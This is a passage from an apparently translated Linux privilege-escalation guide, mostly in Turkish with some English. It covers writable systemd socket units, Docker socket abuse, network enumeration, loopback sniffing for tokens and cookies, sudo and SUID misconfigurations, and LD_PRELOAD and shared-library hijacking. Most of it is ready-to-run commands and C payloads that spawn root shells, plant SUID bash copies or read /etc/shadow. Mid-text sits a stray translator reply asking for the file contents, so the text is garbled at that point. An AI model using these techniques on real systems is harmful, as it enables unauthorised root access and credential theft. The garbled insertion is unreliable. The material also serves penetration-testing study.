- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleme **sockets**/FIFO'lar **oluşturulup** bağlanmadan önce veya sonra **çalıştırılır**. Komut satırının ilk token'i mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar **kapatılmadan** ve kaldırılmadan önce veya sonra **çalıştırılan** ek **komutlar**dır.
- `Service`: Gelen trafik üzerine **etkinleştirilecek** **service unit** adını belirtir. Bu ayar sadece Accept=no olan socket'ler için izinlidir. Varsayılan olarak socket ile aynı adı taşıyan service'i (sonek değiştirilmiş) kullanır. Çoğu durumda bu seçeneği kullanmaya gerek yoktur.

### Writable .socket files

Eğer **yazılabilir** bir `.socket` dosyası bulursanız `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekir.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Başka yüksek etkili bir yanlış yapılandırma ise:

- bir socket unit ile `Accept=no` ve `Service=<name>.service`
- referans verilen service unit mevcut değil
- bir saldırgan `/etc/systemd/system` içine (veya başka bir unit arama yoluna) yazabilir

Bu durumda saldırgan `<name>.service` oluşturabilir, sonra socket'e trafik tetikleyerek systemd'nin yeni servisi root olarak yükleyip çalıştırmasını sağlayabilir.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Yazılabilir sockets

Eğer **herhangi bir yazılabilir socket tespit ederseniz** (_şu anda burada Unix Sockets'ten bahsediyoruz, config `.socket` dosyalarından değil_), **o socket ile iletişim kurabilirsiniz** ve belki bir vulnerability'yi exploit edebilirsiniz.

### Unix Sockets'i Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** istekleri olabileceğini unutmayın (_.socket files hakkında konuşmuyorum ama unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Eğer soket **HTTP isteğine cevap veriyorsa**, onunla **iletişim kurabilir** ve belki bazı zafiyetleri **exploit** edebilirsiniz.

### Yazılabilir Docker Soketi

Docker soketi, genellikle `/var/run/docker.sock`'ta bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. Bunun nasıl yapılabileceğinin bir dökümü ve Docker CLI mevcut değilse alternatif yöntemler aşağıdadır.

#### **Docker CLI ile Privilege Escalation**

Docker soketine yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimle bir container çalıştırmanıza izin verir.

#### **Docker API'ını Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker socket yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Mevcut imajların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun ve içinde komut çalıştırmayı mümkün kılın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişim ile doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

Dikkat: Eğer docker socket üzerinde yazma izinleriniz varsa çünkü **`docker` grubunun içindeyseniz** [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların etkin şekilde etkileşmesine ve veri paylaşmasına olanak sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi gözetilerek tasarlanmış olup, uygulamalar arasındaki farklı iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arası veri alışverişini geliştiren temel IPC'yi destekler, bu açıdan bir çeşit **enhanced UNIX domain sockets** gibidir. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olur ve sistem bileşenleri arasında sorunsuz entegrasyonu kolaylaştırır. Örneğin, bir Bluetooth daemon'undan gelen arama bildirimi bir müzik oynatıcıyı sessize aldırabilir. Ek olarak, D-Bus uzak nesne sistemini destekler; bu sayede servis istekleri ve metod çağırımları basitleşir ve geleneksel olarak karmaşık olan işlemler kolaylaşır.

D-Bus, mesaj izinlerini (metod çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin suistimali yoluyla privilege escalation mümkün olabilir.

Böyle bir politikaya `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde bir örnek verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1` üzerinde sahiplik, gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanır; while "default" context politikaları diğer özel politikalarla kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Burada bir D-Bus iletişimini enumerate ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Giden filtreleme için hızlı triage

Sunucu komut çalıştırabiliyorsa ancak callbacks başarısız oluyorsa, DNS, transport, proxy ve route filtering'i hızlıca birbirinden ayırın:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Her zaman, erişim sağlamadan önce etkileşimde bulunamadığınız makinede çalışan network servislerini kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Bind target'e göre listeners'ları sınıflandır:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişilebilir.
- `127.0.0.1` / `::1`: yalnızca yerel (tunnel/forward için iyi adaylar).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle sadece iç segmentlerden erişilebilir.

### Sadece yerel hizmetlerin önceliklendirme iş akışı

Bir host'u ele geçirdiğinizde, `127.0.0.1`'e bağlı servisler genellikle shell'inizden ilk kez erişilebilir hale gelir. Hızlı bir yerel iş akışı şudur:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS bir ağ tarayıcısı olarak (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra, linPEAS odaklı bir ağ tarayıcısı olarak çalıştırılabilir. `$PATH` içinde bulunan ikili dosyaları (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve ek araç yüklemez.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Eğer `-d`, `-p` veya `-i`'yi `-t` olmadan verirseniz, linPEAS bir pure network scanner gibi davranır (skipping the rest of privilege-escalation checks).

### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı credentials ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation sırasında özellikle değerlidir çünkü birçok yalnızca dahili hizmet orada tokens/cookies/credentials ifşa eder:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
I don't have the file contents. Please paste the contents of src/linux-hardening/privilege-escalation/README.md (or upload the text) and I'll translate it to Turkish, preserving all markdown, tags, links and paths as you requested.
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Genel Keşif

Kontrol edin **kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root privileges**'a sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Sizi root ayrıcalıkları verebilecek **bir grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panoda ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın **herhangi bir parolasını biliyorsan** parolayı kullanarak **her kullanıcı için oturum açmayı dene**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsan ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force ile kırmayı deneyebilirsin.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcıları brute-force etmeyi dener.

## Yazılabilir $PATH istismarları

### $PATH

Eğer **$PATH içindeki bazı klasörlere yazabiliyorsan** yazılabilir klasörün içine farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturmak** suretiyle ayrıcalıkları yükseltebilirsin; tabii bu komut, $PATH içinde yazılabilir klasöründen önce yer alan bir klasörden **yüklenmiyorsa**.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırmana izin verilebilir veya dosyaların suid biti set edilmiş olabilir. Bunu kontrol et:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komutu çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bazı komutları parola gerekmeksizin çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `vim`'i `root` olarak çalıştırabiliyor; artık `ssh key` ekleyerek root directory'ye veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu direktif, kullanıcının bir şey çalıştırırken **set an environment variable** yapmasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer**'a dayalı olarak, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e karşı **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep aracılığıyla korunmuş → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çalıştırırken Bash’in etkileşimli olmayan başlatma davranışından faydalanarak root olarak keyfi kod çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimli olmayan shell'lerde, Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'i veya bir shell wrapper'ı çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (non-interactive olarak `/bin/bash`'ı çağıran herhangi bir hedef veya herhangi bir bash scripti).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
- Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
- Consider sudo I/O logging and alerting when preserved env vars are used.

### sudo ile korunmuş HOME (!env_reset) altında Terraform

If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.

- Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake'ini başarısız kılacak, ancak payload'u root olarak çalıştırıp ölmeden önce geride SUID bir shell bırakacaktır.

### TF_VAR overrides + symlink doğrulama bypass

Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink'i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak (ör. provider’s hedef yolunu `/etc/cron.d/` içinde gösterecek şekilde) ayrıcalıklı yollara **yazmak** için kullanılabilir.

### requiretty / !requiretty

Bazı eski dağıtımlarda, sudo `requiretty` ile yapılandırılabilir; bu, sudo'nun yalnızca etkileşimli bir TTY'den çalıştırılmasını zorunlu kılar. Eğer `!requiretty` ayarlıysa (veya seçenek yoksa), sudo reverse shells, cron jobs veya scripts gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
Bu tek başına doğrudan bir güvenlik açığı değildir, ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Eğer `sudo -l` `env_keep+=PATH` veya saldırganın yazabileceği girişler içeren bir `secure_path` gösteriyorsa (ör. `/home/<user>/bin`), sudo ile izin verilmiş hedef içindeki herhangi bir göreli komut gölgelenebilir.

- Gereksinimler: mutlak yollar kullanılmadan komut çağıran bir script/binary çalıştıran bir sudo kuralı (çoğunlukla `NOPASSWD`) ve öncelikle aranan yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütme atlatma yolları
Başka dosyaları okumak için **atlayın** veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmeden

Eğer **sudo permission** bir tek komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik ayrıca bir **suid** binary başka bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary başka bir komutu yolunu belirterek çalıştırıyorsa, suid dosyasının çağırdığı komutla aynı isimde bir **function** oluşturarak bunu **export** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, bu **function**'ı oluşturup **export** etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary'yi çağırdığınızda, bu fonksiyon çalıştırılacaktır

### SUID wrapper tarafından çalıştırılan yazılabilir script

Yaygın bir custom-app yanlış yapılandırması, bir script çalıştıran root-owned SUID binary wrapper'dır; scriptin kendisi ise low-priv users tarafından yazılabilir.

Tipik desen:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Eğer `/usr/local/bin/backup.sh` yazılabiliyorsa, payload komutları ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırılırken
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Sıradışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, doğru şekilde **.so** dosyalarını yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak exploitation için bir potansiyel olduğunu gösterir.

Bunu exploit etmek için, aşağıdaki kodu içeren bir C dosyası, örneğin _"/path/to/.config/libcalc.c"_, oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldığında, dosya izinlerini manipüle ederek ve ayrıcalıklı bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary çalıştırıldığında exploit tetiklenecek ve potansiyel olarak system compromise'a neden olabilir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazma iznine sahip olduğumuz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer şu gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) yerel güvenlik kısıtlamalarını aşmak için bir saldırgan tarafından sömürülebilecek Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeydir, ancak bir komutta **sadece argümanları enjekte edebildiğiniz** durumlar içindir.

Proje, kısıtlı shell'lerden kaçmak, ayrıcalıkları yükseltmek veya korumak, dosya aktarmak, bind and reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl kullanabileceğini bulup bulamayacağını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

